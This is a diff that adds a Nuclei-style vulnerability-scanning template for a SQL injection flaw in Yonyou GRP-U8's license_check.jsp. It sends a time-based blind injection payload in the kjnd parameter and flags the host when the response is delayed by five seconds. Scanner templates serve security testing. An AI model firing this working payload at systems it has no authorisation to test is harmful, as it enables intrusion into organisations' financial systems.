@@ -1,0 +1,23 @@
+id: yongyouU8-license_check-sqli
+
+info:
+  name: 用友GRP-U8 license_check.jsp sql注入漏洞
+  author: 公众号网络安全透视镜
+  severity: high
+
+variables:
+  
+
+http:
+  - raw:
+      - |
+          GET /u8qx/license_check.jsp?kjnd=1';WAITFOR%20DELAY%20'0:0:5'-- HTTP/1.1
+          Host: {{Hostname}}
+
+
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration >= 5'
